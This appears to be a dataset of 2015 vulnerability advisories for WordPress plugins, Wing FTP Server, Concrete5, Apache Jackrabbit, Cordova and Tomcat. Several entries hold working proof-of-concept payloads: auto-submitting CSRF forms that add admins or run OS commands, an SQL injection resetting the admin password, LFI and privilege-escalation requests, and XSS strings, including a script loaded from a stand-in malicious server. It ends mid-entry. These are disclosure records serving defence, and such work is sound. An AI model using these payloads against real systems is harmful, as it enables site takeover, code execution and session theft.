4642,CVE-2015-4010 - Cross-site Request Forgery & Cross-site Scripting in Encrypted Contact Form Wordpress Plugin v1.0.4,,CVE-2015-4010,"# Title: CVE-2015-4010 - Cross-site Request Forgery & Cross-site Scripting in Encrypted
Contact Form Wordpress Plugin v1.0.4
# Submitter: Nitin Venkatesh
# Product: Encrypted Contact Form Wordpress Plugin
# Product URL: https://wordpress.org/plugins/encrypted-contact-form/
# Vulnerability Type: Cross-site Request Forgery [CWE-352], Cross-site
scripting[CWE-79]
# Affected Versions: v1.0.4 and possibly below.
# Tested versions: v1.0.4
# Fixed Version: v1.1
# Link to code diff: https://plugins.trac.wordpress.org/changeset/1125443/
# Changelog: https://wordpress.org/plugins/encrypted-contact-form/changelog/
# CVE Status: CVE-2015-4010
## Product Information:
Secure contact form for WordPress. Uses end-to-end encryption to send user
information. Not even your hosting provider can view the content.
Let users send you information in a secure way. Uses I.CX messaging service
to encrypt user content in their own web browsers before sending to you.
## Vulnerability Description:
The forms in the admin area of the plugin are vulnerable to CSRF, via which
the contact forms generated are susceptible to XSS via unsanitized POST
parameter.
For example, the admin function of updating an existing form can be done
via CSRF. Hence, by submitting a crafted HTML string in the parameters via
CSRF, a XSS attack gets launched which affects all the visitors of the
page(s) containing the contact form.
## Proof of Concept:
<form action=""http://localhost/wp-admin/options-general.php?page=conformconf"";
method=""post"">
<input type=""hidden"" name=""name"" value=""required"" />
<input type=""hidden"" name=""email"" value=""optional"" />
<input type=""hidden"" name=""phone"" value=""off"" />
<input type=""hidden"" name=""message"" value=""required"" />
<input type=""hidden"" name=""display_name"" value=""Example"" />
<input type=""hidden"" name=""recipient_name"" value=""example"" />
<input type=""hidden"" name=""cfc_page_name"" value="""" />
<!-- Wordpress page-id value -->
<input type=""hidden"" name=""existing_page"" value=""28"" />
<input type=""hidden"" name=""cfc_selection"" value=""upd"" />
<input type=""hidden"" name=""iframe_url""
value=""&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert('XSS!');&lt;/script&gt;""
/>
<input type=""submit"" value=""Update Page"">
</form>
## Solution:
Upgrade to v1.1 of the plugin.
## Disclosure Timeline:
2015-03-26 - Discovered. Contacted developer on support forums.
2015-03-27 - Contacted developer via contact form on vendor site.
2015-04-01 - Fixed v1.1 released.
2015-05-15 - Published disclosure on FD.
2015-05-16 - CVE assigned
## References:
CVE Assign - http://seclists.org/oss-sec/2015/q2/471
http://packetstormsecurity.com/files/131955/
https://wpvulndb.com/vulnerabilities/7992
## Disclaimer:
This disclosure is purely meant for educational purposes. I will in no way
be responsible as to how the information in this disclosure is used."
4645,CVE-2015-4109 - WordPress Users Ultra Plugin [SQL injection],,CVE-2015-4109,"# Exploit Title: CVE-2015-4109 - WordPress Users Ultra Plugin [SQL injection]
# Date: 2015/05/30
# Exploit Author: Panagiotis Vagenas
# Contact: https://twitter.com/panVagenas
# Vendor Homepage: http://usersultra.com
# Software Link: https://wordpress.org/plugins/users-ultra/
# Version: 1.5.15
# Tested on: WordPress 4.2.2
# Category: webapps
# CVE: CVE-2015-4109
One can perform an SQL injection attack simply by exploiting wp_ajax_nopriv_rating_vote action.
POST parameters data_target and data_vote can be used to execute arbitrary SQL commands in the database.
In the following PoC we change the administrators password to '1' so a malicious user can then login as the administrator, taking full control of the website.
* Send a post request to `http://my.vulnerable.website.com/wp-admin/admin-ajax.php` with data: action=rating_vote&data_id=1
&data_target=user_id IN (1); UPDATE wp_users set user_pass=MD5(1) where ID &data_vote=1
* Login with administrator's user name and password '1'
Note that we assume that table name prefix is 'wp' and administrators user id is 1, a very common scenario.
* Timeline
2015-05-29 Discovered
2015-05-30 Vendor notified via contact form
2015-06-01 Vendor notified via email
2015-06-02 Vendor notified via support forums at wordpress.org
2015-06-02 Vendor responded
2015-06-04 Fix released in version 1.5.16"
4648,[CVE-2015-4108] Wing FTP Server Cross-site Request Forgery vulnerabilities,,CVE-2015-4108,"Exploit Title: Wing FTP Server Cross-site Request Forgery vulnerabilities
Product: Wing FTP Server
Vulnerable Versions: 4.4.6 and all previous versions
Tested Version: 4.4.6
Advisory Publication: 05/06/2015
Latest Update: 05/06/2015
Vulnerability Type: Cross-site Request Forgery [CWE-352]
CVE Reference: CVE-2015-4018
Credit: Alex Haynes
Advisory Details:
(1) Vendor & Product Description
--------------------------------
Vendor:Wing FTP software
Product & Version:
Wing FTP Server v 4.4.6
Vendor URL & Download:
http://www.wftpserver.com/
Product Description:
""Wing FTP Server is an easy-to-use, secure and feature-rich enterprise FTP Server that can be used in Windows, Linux, Mac OSX and Solaris. It supports a number of file transfer protocols, including FTP, HTTP, FTPS, HTTPS and SFTP server, giving your end-users flexibility in how they connect to the server. And it provides admins with a web based interface to administrate the server from anywhere. You can also monitor server performance and online sessions and even receive email notifications about various events taking place on the server.""
(2) Vulnerability Details:
--------------------------
The admin interface of Wing FTP Server is vulnerable to a Cross-site Request Forgery (CSRF) vulnerabilities. All functionalities including (but not limited to), addition and deletion of domain administrators, regular users, starting and stopping servers or creating and deleting FTP domains are vulnerable to Cross-site request Forgeries.
Proof of concept for RCE [CVE-2015-4018]:
-----------------------------------------
POC adds a domain administrator to the FTP server.
<html>
<body>
<form action=""http://<server address>:5466/admin_addadmin.html"" method=""POST"">
<input type=""hidden"" name=""admin"" value=""&#123;&quot;username&quot;&#58;&quot;admin2&quot;&#44;&quot;password&quot;&#58;&quot;admin2&quot;&#44;&quot;oldpassword&quot;&#58;&quot;&quot;&#44;&quot;readonly&quot;&#58;0&#44;&quot;domainadmin&quot;&#58;1&#44;&quot;domainlist&quot;&#58;&quot;test&quot;&#44;&quot;mydirectory&quot;&#58;&quot;&quot;&#44;&quot;ipmasks&quot;&#58;&#91;&#93;&#125;"" />
<input type=""submit"" value=""Submit request"" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
(3) Advisory Timeline:
----------------------
27/05/2015 - First Contact
27/05/2015 - Vendor responds with requests for details of vulnerabilities.
28/05/2015 - Vulnerability details sent with POC.
28/05/2015 - Vendor requests clarification on impact and various attack scenarios.
28/05/2015 - Vulnerability scenarios defined.
29/05/2015 - Vulnerability confirmed and new version 4.4.7 released. Requests a week delay before public disclosure.
05/06/2015 - Public disclosure
(4)Solution:
------------
Fixed in 4.4.7.
(5) Credits:
------------
Discovered by Alex Haynes
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4018
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-4018"
4649,[CVE-2015-4107] Wing FTP Server Remote Code Execution vulnerability,,CVE-2015-4107,"Exploit Title: Wing FTP Server Remote Code Execution vulnerability
Product: Wing FTP Server
Vulnerable Versions: 4.4.6 and all previous versions
Tested Version: 4.4.6
Advisory Publication: 05/06/2015
Latest Update: 05/06/2015
Vulnerability Type: Improper Control of Generation of Code [CWE-94]
CVE Reference: CVE-2015-4107
Credit: Alex Haynes
Advisory Details:
(1) Vendor & Product Description
--------------------------------
Vendor:Wing FTP software
Product & Version:
Wing FTP Server v 4.4.6
Vendor URL & Download:
http://www.wftpserver.com/
Product Description:
""Wing FTP Server is an easy-to-use, secure and feature-rich enterprise FTP Server that can be used in Windows, Linux, Mac OSX and Solaris. It supports a number of file transfer protocols, including FTP, HTTP, FTPS, HTTPS and SFTP server, giving your end-users flexibility in how they connect to the server. And it provides admins with a web based interface to administrate the server from anywhere. You can also monitor server performance and online sessions and even receive email notifications about various events taking place on the server.""
(2) Vulnerability Details:
--------------------------
The admin interface of Wing FTP Server is vulnerable to a Remote Code Execution (RCE) vulnerability.
Proof of concept for RCE [CVE-2015-4107]:
-----------------------------------------
The RCE can be exploited in two scenarios, either by a CSRF attack (the admin interface is vulnerable to CSRF attacks) or by being authenticated to the admin interface. The attack leverages the LUA CLI to inject commands at the same privilege as the web server.
The RCE via CSRF POC
<html>
<body>
<form action=""http://<server address>:5466/admin_lua_script.html"" method=""POST"" enctype=""text/plain"">
<input type=""hidden"" name=""command"" value=""os.execute('<any OS command here>')"" />
<input type=""submit"" value=""Submit request"" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
RCE via authenticated administrator
1) Either utilising the LUA Console interface directly and using the os.execute('<OS command here>') method.
2) POST directly using CURL with an authenticated cookie:
curl -i -s -k -X 'POST' -b 'admin_lang=english; UIDADMIN=b8b208e2239f462c11641eaa10cde7b0' --data-binary $'command=os.execute('cmd.exe')'
'http://<server address>:5466/admin_lua_script.html'
Parameter names: ""command""
Parameter Type: POST
Attack Pattern:
Any OS command can be inserted into the os.execute('') method.
(3) Advisory Timeline:
----------------------
27/05/2015 - First Contact
27/05/2015 - Vendor responds with requests for details of vulnerabilities.
28/05/2015 - Vulnerability details sent with POC.
28/05/2015 - Vendor requests clarification on impact and various attack scenarios.
28/05/2015 - Vulnerability scenarios defined.
29/05/2015 - Vulnerability confirmed and new version 4.4.7 released. Requests a week delay before public disclosure.
05/06/2015 - Public disclosure
(4)Solution:
------------
CSRF attack vector fixed in version 4.4.7. No fix for authenticated RCE at this time.
(5) Credits:
------------
Discovered by Alex Haynes
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4107
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-4107"
4653,CVE-2015-4153 - WordPress zM Ajax Login & Register Plugin [Local File Inclusion],,CVE-2015-4153,"# Exploit Title: CVE-2015-4153 - WordPress zM Ajax Login & Register Plugin [Local File Inclusion]
# Date: 2015/06/01
# Exploit Author: Panagiotis Vagenas
# Contact: https://twitter.com/panVagenas
# Vendor Homepage: http://zanematthew.com/
# Software Link: https://downloads.wordpress.org/plugin/zm-ajax-login-register.1.0.9.zip
# Version: 1.0.9
# Tested on: WordPress 4.2.2
# Category: webapps
# CVE: CVE-2015-4153
* Description
Any authenticated or non-authenticated user can perform a local file inclusion attack by exploiting the wp_ajax_nopriv_load_template action. Plugin simply includes the file specified in 'template' POST parameter without any further validation.
* Proof of Concept
Send a post request to `http://my.vulnerable.website.com/wp-admin/admin-ajax.php` with data: `action=load_template&template=[relative path to local file]&security=[wp nonce]&referer=[action from which the nonce came from]`
* Timeline
2015/06/01 Discovered
2015/06/01 Vendor alerted via contact form at his website
2015/06/03 Vendor responded
2015/06/03 Fixed in version 1.1.0
* Solution
Update to version 1.1.0"
4667,CVE-2015-4039 - WordPress WP Membership plugin [Stored XSS],,CVE-2015-4039,"# Exploit Title: WordPress WP Membership plugin [Stored XSS]
# Contact: https://twitter.com/panVagenas
# Vendor Homepage: http://wpmembership.e-plugins.com/
# Software Link: http://codecanyon.net/item/wp-membership/10066554
# Version: 1.2.3
# Tested on: WordPress 4.2.2
# CVE: CVE-2015-4039
=============================================
* 1. Stored XSS
=============================================
1.1 Description
All input fields from registered users aren't properly escaped. This could lead to an XSS attack that could possibly affect all visitors of the website, including administators.
1.2 Proof of Concept
* Login as regular user
* Update any field of your profile appending at the end
`<script>alert('XSS');</script>`
or
`<script src=�http://malicious .server/my_malicious_script.js�/>`
1.3 Actions taken after discovery
Vendor was informed on 2015/05/19.
1.4 Solution
No official solution yet exists.
=============================================
* 2. Unauthorized post publish and stored XSS
=============================================
2.1 Description
Registered users can publish a post without administrator confirmation. Normally all posts submitted by users registered with WP Membership plugin are stored with the status `pending`. A malicious user though can publish his post by crafting the form is used for submission.
2.2 Proof of Concept
* Login as regular user
whom belongs to a group that can submit new posts
* Visit the `New Post` section at your profile
* Change field `post_status`:
<select id=""post_status"" class=""form-control"" name=""post_status"">
<option value=""publish"" selected=�selected�>Pending Review</option>
<option value=""draft"">Draft</option>
</select>
The post gets immediately published after you submit the form and is visible to all visitors of the website.
In addition a stored XSS attack can be performed due to insufficient escaping of the post content input.
2.3 Actions taken after discovery
Vendor was informed on 2015/05/19.
2.4 Solution
No official solution yet exists.
2.5 Workaround
Prevent users from submitting new posts through the relative option in plugin's settings"
4668,CVE-2015-4038 - WordPress WP Membership plugin [Privilege escalation],,CVE-2015-4038,"# Exploit Title: WordPress WP Membership plugin [Privilege escalation]
# Contact: https://twitter.com/panVagenas
# Vendor Homepage: http://wpmembership.e-plugins.com/
# Software Link: http://codecanyon.net/item/wp-membership/10066554
# Version: 1.2.3
# Tested on: WordPress 4.2.2
# CVE: CVE-2015-4038
1 Description
Any registered user can perform a privilege escalation through `iv_membership_update_user_settings` AJAX action.
Although this exploit can be used to modify other plugin related data (eg payment status and expiry date), privilege escalation can lead to a serious incident because the malicious user can take administrative role to the infected website.
2 Proof of Concept
* Login as regular user
* Sent a POST request to `http://example.com/wp-admin/admin-ajax.php` with data: `action=iv_membership_update_user_settings&form_data=user_id%3D<yourUserID>%26user_role%3Dadministrator`
3 Actions taken after discovery
Vendor was informed on 2015/05/19.
4 Solution
No official solution yet exists."
4684,CVE-2015-1835: ...,,CVE-2015-1835,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2015-1835: Remote exploit of secondary configuration variables in
Apache Cordova on Android
Severity: High
Vendor: The Apache Software Foundation
Versions Affected:
Cordova Android up to 4.0.1 (3.7.2 excluded)
Description:
Android applications built with the Cordova framework that don't have
explicit values set in Config.xml can have undefined configuration
variables set by Intent. This can cause unwanted dialogs appearing
in applications and changes in the application behaviour that can
include the app force-closing.
The latest release of Cordova Android entirely removes the ability
of configuration parameters to be set by intents. This change is
an API change in the platform, and third-party plugins that use
values set in the config.xml should make sure that they use the
preferences API instead of relying on the Intent bundle, whcih
can be manipulated in this case.
Upgrade path:
Developers who are concerned about this should rebuild their
applications with either Cordova Android 4.0.2, or Cordova 3.7.4
if they are unable to upgrade to Cordova 4.0.2. Developers should
also make sure that variables that they wish to have protected
are specified in their config.xml.
Credit:
This issue was discovered by Seven Shen of Trend Micro Mobile Threat Research Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0
Comment: This message is encrypted and/or signed with PGP (gnu-pg, gpg). Contact dirkx webweaving org if you cannot read it.
iQCVAwUBVWbyfDGmPZbsFAuBAQim5gP8C/3m6DPI4YljLINtgtXgK+NOI2InjBPI
MA0bb10da+XUCLrcHoJnMHdBL2aGhltnKapNjp4I4gph0QIkhlhIUXelHojPSjRH
3ectaNsFCTJHofHKiMROtH3Fb5Gqo5U7LPtduvjCE4q/rJB/9LOHIojwWw/VqQo3
eBPdk/6bSaw=
=ax4a
-----END PGP SIGNATURE-----"
4690,CVE-2015-4084 - WordPress Free Counter Plugin [Stored XSS],,CVE-2015-4084,"# Exploit Title: WordPress Free Counter Plugin [Stored XSS]
# Date: 2015/05/25
# Exploit Author: Panagiotis Vagenas
# Contact: https://twitter.com/panVagenas
# Vendor Homepage: http://www.free-counter.org
# Software Link: https://wordpress.org/plugins/free-counter/
# Version: 1.1
# Tested on: WordPress 4.2.2
# Category: webapps
# CVE: CVE-2015-4084
1. Description
Any authenticated or non-authenticated user can perform a stored XSS attack simply by exploiting wp_ajax_nopriv_check_stat action.
Plugin uses a widget to display website's visits, so any page that contains this widget will also load the malicious JS code.
2. Proof of Concept
* Send a post request to `http://www.free-counter.org/Api.php` in order to reveal the counter id of the vulnerable site. The POST data must contain the following vars: `action=create_new_counter&site_url=http%3A%2f%my.vulnerable.website.com`
* As a response we get a serialized indexed array. The value that we need to know is the 'counter_id'.
* Send a post request to `http://my.vulnerable.website.com/wp-admin/admin-ajax.php` with data: `action=check_stat&id_counter=<counter_id from step 2>&value_=<script>alert(1)</script>`
* Visit a page of the infected website that displays plugin's widget.
Note that the plugin uses the update_option function to store the $_POST['value_'] contents to DB so any code inserted there will be escaped. Even though a malicious user can omit the quotes in the src attr of the script tag. Most modern browsers will treat the tag as they were there.
3. Solution
No official solution yet exists."
4707,CVE-2015-1833 (Jackrabbit WebDAV XXE vulnerability),,CVE-2015-1833,"Dear readers,
we just fixed a recently reported vulnerability in Apache Jackrabbit's WebDAV module; see
- the attached CVE report
- patches for all currently maintained Jackrabbit branches
We just released Jackrabbit 2.10.1 (see below) and we'll get to the other branches shortly. Check the CVE for details about what to do for earlier branches if you can't wait for a release.
Thanks to <0ang3el gmail com> for bringing this to our attention and giving valuable feedback while we investigated the problem.
Thanks and best regards, Julian
-------- Forwarded Message --------
Subject: [ANNOUNCE] Apache Jackrabbit 2.10.1 released
Date: Thu, 21 May 2015 11:22:04 +0200
From: Marcel Reutegger <mreutegg apache org>
Reply-To: users jackrabbit apache org
To: announce apache org, announce jackrabbit apache org, Jackrabbit Developers <dev jackrabbit apache org>, Jackrabbit Users <users jackrabbit apache org>, 0ang3el 0ang3el <0ang3el gmail com>, security apache org, oss-security lists openwall com, bugtraq securityfocus com
The Apache Jackrabbit community is pleased to announce the release of
Apache Jackrabbit 2.10.1. This release fixes an important security issue in
the jackrabbit-webdav module reported by Mikhail Egorov.
The release is available for download at:
http://jackrabbit.apache.org/downloads.html
See the full release notes below for details about this release.
Release Notes -- Apache Jackrabbit -- Version 2.10.1
Introduction
------------
This is Apache Jackrabbit(TM) 2.10.1, a fully compliant implementation of the
Content Repository for Java(TM) Technology API, version 2.0 (JCR 2.0) as
specified in the Java Specification Request 283 (JSR 283).
Apache Jackrabbit 2.10.1 is a patch release that contains fixes and
improvements over Jackrabbit 2.10. Jackrabbit 2.10.x releases are considered
stable and targeted for production use.
Security advisory (JCR-3883 / CVE-2015-1833)
--------------------------------------------
This release fixes an important security issue in the jackrabbit-webdav module
reported by Mikhail Egorov.
When processing a WebDAV request body containing XML, the XML parser can be
instructed to read content from network resources accessible to the host,
identified by URI schemes such as ""http(s)"" or ""file"". Depending on the
WebDAV request, this can not only be used to trigger internal network
requests, but might also be used to insert said content into the request,
potentially exposing it to the attacker and others (for instance, by inserting
said content in a WebDAV property value using a PROPPATCH request). See also
IETF RFC 4918, Section 20.6.
Users of the jackrabbit-webdav module are advised to immediately update the
module to this release or disable WebDAV access to the repository. Users
on earlier versions of Jackrabbit who are unable to upgrade to 2.10.1 should
apply the fix to the corresponding 2.x branch or disable WebDAV access until
official releases of those earlier versions are available. Patches for 2.x
branches are attached to the JIRA issue.
Changes since Jackrabbit 2.10.0
-------------------------------
Bug fixes
[JCR-3853] JCR2SPI: Load ac provider resource
[JCR-3871] POI Vulnerabilities
[JCR-3872] Config DTD does not declare ProtectedItemImporter elements
[JCR-3873] CachingDataStore not safe against crashes, corrupted
uploads file will prevent system startup
[JCR-3876] POM dependency to jackrabbit-data test-jar is not test-scoped
[JCR-3878] Fix test case failure in jackrabbit-data
[JCR-3883] Jackrabbit WebDAV bundle susceptible to XXE/XEE attack
Improvements
[JCR-3864] CachingDatastore -cache file sizes to save remote call to
remote datastore( S3DS)
[JCR-3868] Adapt TestCaseBase.java to test for FileDatastore
[JCR-3869] CachingDataStore for SAN or NFS mounted storage
[JCR-3879] Remove contention in AsyncUploadCache to improve performance
[JCR-3881] Change CachingFDS configuration properties
New Features
[JCR-3836] Allow to get an Authorizable of a given type
Sub-tasks
[JCR-3837] Add AuthorizableTypeException in user security API package
In addition to the above-mentioned changes, this release contains
all the changes included up to the Apache Jackrabbit 2.10.0 release.
For more detailed information about all the changes in this and other
Jackrabbit releases, please see the Jackrabbit issue tracker at
https://issues.apache.org/jira/browse/JCR
Release Contents
----------------
This release consists of a single source archive packaged as a zip file.
The archive can be unpacked with the jar tool from your JDK installation.
See the README.txt file for instructions on how to build this release.
The source archive is accompanied by SHA1 and MD5 checksums and a PGP
signature that you can use to verify the authenticity of your download.
The public key used for the PGP signature can be found at
https://svn.apache.org/repos/asf/jackrabbit/dist/KEYS.
About Apache Jackrabbit
-----------------------
Apache Jackrabbit is a fully conforming implementation of the Content
Repository for Java Technology API (JCR). A content repository is a
hierarchical content store with support for structured and unstructured
content, full text search, versioning, transactions, observation, and
more.
For more information, visit http://jackrabbit.apache.org/
About The Apache Software Foundation
------------------------------------
Established in 1999, The Apache Software Foundation provides organizational,
legal, and financial support for more than 140 freely-available,
collaboratively-developed Open Source projects. The pragmatic Apache License
enables individual and commercial users to easily deploy Apache software;
the Foundation's intellectual property framework limits the legal exposure
of its 3,800+ contributors.
For more information, visit http://www.apache.org/
Trademarks
----------
Apache Jackrabbit, Jackrabbit, Apache, the Apache feather logo, and the Apache
Jackrabbit project logo are trademarks of The Apache Software Foundation."
4734,[SECURITY] CVE-2014-7810: Apache Tomcat Security Manager Bypass,,CVE-2014-7810,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2014-7810 Security Manager Bypass
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1 to 8.0.15
- - Apache Tomcat 7.0.0 to 7.0.57
- - Apache Tomcat 6.0.0 to 6.0.43
Description:
Malicious web applications could use expression language to bypass the
protections of a Security Manager as expressions were evaluated within
a privileged code section.
This issue only affects installations that run web applications from
untrusted sources.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.17 or later
(8.0.16 has the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.59 or later
(7.0.58 has the fix but was not released)
- - Upgrade to Apache Tomcat 6.0.44 or later
Credit:
This issue was discovered by the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJVVKsbAAoJEBDAHFovYFnnTkYQAMos6+1kaJ+d+h0oGeiG7CDV
PxcQ/AS0LdqXZuC92dXYNv+eQTB+pD0N9ePIyIMwsyEzeS2KGyOw5R8Klsro6lcq
eYKH8Tv7egIzKO9dRCqhyWTytl73KPf0h6z4nnVHr/rTJ2/7pJX6x+7fjey5jcO+
G7kCQErj6bnNzgeMM/mLLVlM7YYrbA5hbQgplCdgRO5NpxaL+3raaJ19/gFZKjP3
Mqgwg/6uopkgxTFRh8Fprj6tdoPBXZ6Vxy3qJmcuOCt0yktaypqFPLTH+JM6pnme
6/Mdk4u6PhKyGPPlmvrub0priFl32tEyJNBkghHJd2QkYkZrM6t3wcOsgUawPJxZ
hJrq+nJ7CJ3FUzcj9o05M4Q/TJ7seOurhPXF8YMIPn7ibrSb1Eq2Y0yZe/NGij/k
dOZX5m3I62HeS1zjCIcIhKx9i6ZFTvfoe8/bF6/LPgAqfy2AB8+HBrRGVfqUh/QB
w3AdDX7BxDWJKVgz9YknJG9keuR0tLV+MOI0M0LS9LHj9wAiunmq/+x03ZUX+coc
btTrKnSuZq5sjmX5Xj7rilrSlq1GftGMnQyxOHiIzjCR9b59yS/BX/OkprrFXIAM
Nd42B7vxWubKuOhXlyMlDt4QpnM3RsAFaD3irNc3LAQ3kpdtvsinExr3VaCvIcJ1
IETAzUe85oPF2HojrJDu
=2DTj
-----END PGP SIGNATURE-----"
4744,Concrete5 Security Advisory - Multiple XSS Vulnerabilities - CVE-2015-2250,,CVE-2015-2250,"Information
--------------------
Advisory by Netsparker.
Name: Multiple XSS Vulnerabilities in Concrete5
Affected Software : Concrete5
Affected Versions: 5.7.3.1 and possibly below
Vendor Homepage : https://www.concrete5.org
Vulnerability Type : Cross-site Scripting
Severity : Important
CVE-ID: CVE-2015-2250
Netsparker Advisory Reference : NS-15-008
Description
--------------------
By exploiting a Cross-site scripting vulnerability the attacker can
hijack a logged in user’s session. This means that the malicious
hacker can change the logged in user’s password and invalidate the
session of the victim while the hacker maintains access. As seen from
the XSS example in this article, if a web application is vulnerable to
cross-site scripting and the administrator’s session is hijacked, the
malicious hacker exploiting the vulnerability will have full admin
privileges on that web application.
Technical Details
--------------------
Proof of Concept URLs for cross-site scripting vulnerabilities in Concrete5:
URL: /concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success
Parameter Name: banned_word%5b%5d
Parameter Type: POST
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x000936)</scRipt>
URL: /concrete5.7.3.1/index.php/dashboard/reports/logs/view?keywords=&level=&channel='""--></style></scRipt><scRipt>alert(0x0044C4)</scRipt>&level[]=600
Parameter Name: channel
Parameter Type: GET
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x0044C4)</scRipt>
URL: /concrete5.7.3.1/index.php/tools/required/permissions/access_entity?peID=1&pdID=3&accessType='""--></style></scRipt><scRipt>alert(0x00690C)</scRipt>
Parameter Name: accessType
Parameter Type: GET
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x00690C)</scRipt>
URL: /concrete5.7.3.1/index.php/dashboard/system/multilingual/setup/load_icon
Parameter Name: msCountry
Parameter Type: POST
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x00D064)</scRipt>
URL: /concrete5.7.3.1/index.php/tools/required/permissions/access_entity?accessType='""--></style></scRipt><scRipt>alert(0x00687C)</scRipt>&pkCategoryHandle=block_type
Parameter Name: accessType
Parameter Type: GET
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x00687C)</scRipt>
URL: /concrete5.7.3.1/index.php/ccm/system/dialogs/area/design/submit?ccm_token=1423928022:7f9b7c3cb0f6721bab4a0dec86cefaa3&cID=1&arHandle='""--></style></scRipt><scRipt>alert(0x00D33A)</scRipt>
Parameter Name: arHandle
Parameter Type: GET
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x00D33A)</scRipt>
URL: /concrete5.7.3.1/index.php/dashboard/pages/single
Parameter Name: pageURL:
Parameter Type: POST
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x00627A)</scRipt>
URL: /concrete5.7.3.1/index.php/ccm/system/dialogs/area/design?arHandle='""--></style></scRipt><scRipt>alert(0x001D34)</scRipt>&cID=1
Parameter Name: arHandle
Parameter Type: GET
Attack Pattern: '""--></style></scRipt><scRipt>alert(0x001D34)</scRipt>
URL: /concrete5.7.3.1/index.php/dashboard/system/seo/searchindex/updated
Parameter Name: SEARCH_INDEX_AREA_METHOD
Parameter Type: POST
Attack Pattern: '"" onmouseover= alert(0x00047E)
URL: /concrete5.7.3.1/index.php/dashboard/system/optimization/jobs/job_scheduled
Parameter Name: unit
Parameter Type: POST
Attack Pattern: '"" onmouseover= alert(0x000C5A)
URL: /concrete5.7.3.1/index.php/dashboard/system/registration/open/1
Parameter Name: register_notification_email
Parameter Type: POST
Attack Pattern: '"" onmouseover= alert(0x0000DE)
URL: /concrete5.7.3.1/index.php/dashboard/extend/connect/""onmouseover=""alert(0x00170E)
Parameter Name: URI-BASED
Parameter Type: Full URL:
Attack Pattern: /""onmouseover=""alert(0x00170E)
For more information on cross-site scripting vulnerabilities read the
following article:
https://www.netsparker.com/web-vulnerability-scanner/vulnerability-security-checks-index/crosssite-scripting-xss/
Advisory Timeline
--------------------
05/03/2015 - First Contact
06/05/2015 - Vulnerability fixed
11/05/2015 - Advisory released
Solution
--------------------
Download Concrete5 version 5.7.4 which includes fix for this vulnerability.
Credits & Authors
--------------------
These issues have been discovered by Omar Kurt while testing
Netsparker Web Application Security Scanner -
https://www.netsparker.com/web-vulnerability-scanner/
About Netsparker
--------------------
Netsparker finds and reports security issues and vulnerabilities such
as SQL Injection and Cross-site Scripting (XSS) in all websites and
web applications regardless of the platform and the technology they
are built on. Netsparker's unique detection and exploitation
techniques allows it to be dead accurate in reporting hence it's the
first and the only False Positive Free web application security
scanner. For more information visit our website on
https://www.netsparker.com
--
Onur Yılmaz - Turkey Manager
Netsparker Web Application Security Scanner
T: +90 (0)554 873 0482"
4772,Wordpress Twenty Fifteen Theme - DOM XSS Vulnerability - CVE-2015-3429,,CVE-2015-3429,"Information
--------------------
Advisory by Netsparker.
Name: DOM XSS Vulnerability in Twenty Fifteen WordPress Theme
Affected Software : WordPress
Affected Versions: 4.2.1 and probably below
Vendor Homepage : https://wordpress.org/ and
https://wordpress.org/themes/twentyfifteen/
Vulnerability Type : DOM based Cross-site Scripting
Severity : Important
CVE-ID: CVE-2015-3429
Netsparker Advisory Reference : NS-15-007
Description
--------------------
By exploiting a Cross-site scripting vulnerability the attacker can
hijack a logged in user’s session. This means that the malicious
hacker can change the logged in user’s password and invalidate the
session of the victim while the hacker maintains access. As seen from
the XSS example in this article, if a web application is vulnerable to
cross-site scripting and the administrator’s session is hijacked, the
malicious hacker exploiting the vulnerability will have full admin
privileges on that web application.
Technical Details
--------------------
Proof of Concept URL for DOM XSS in WordPress:
http://example.com/wordpress/wp-content/themes/twentyfifteen/genericons/example.html#<img/src/onerror=alert(123)>
For more information on DOM based cross-site scripting vulnerabilities
read the following article:
https://www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/
Advisory Timeline
--------------------
22/04/2015 - First Contact
07/05/2015 - Vulnerability fixed
07/05/2014 - Advisory released
Solution
--------------------
Download WordPress version 4.2.2 which includes fix for this vulnerability.
Credits & Authors
--------------------
These issues have been discovered by Omar Kurt while testing
Netsparker Web Application Security Scanner -
https://www.netsparker.com/web-vulnerability-scanner/
About Netsparker
--------------------
Netsparker finds and reports security issues and vulnerabilities such
as SQL Injection and Cross-site Scripting (XSS) in all websites and
web applications regardless of the platform and the technology they
are built on. Netsparker's unique detection and exploitation
techniques allows it to be dead accurate in reporting hence it's the
first and the only False Positive Free web application security
scanner. For more information visit our website on
https://www.netsparker.com"
4792,[SECURITY] CVE-2014-0230: Apache Tomcat DoS,,CVE-2014-0230,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2014-0230 Denial of Service
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1 to 8.0.8
- - Apache Tomcat 7.0.0 to 7.0.54
- - Apache Tomcat 6.0.0 to 6.0.43
Description:
When a response for a request with a request body is returned to the
user agent before the request body is fully read, by default Tomcat
swallows the remaining request body so that the next request on the
connection may be processed. There was no limit to the size of request
body that Tomcat would swallow. This permitted a limited Denial of
Service as Tomcat would never close the connection and a processing
thread would remain allocated to the connection.
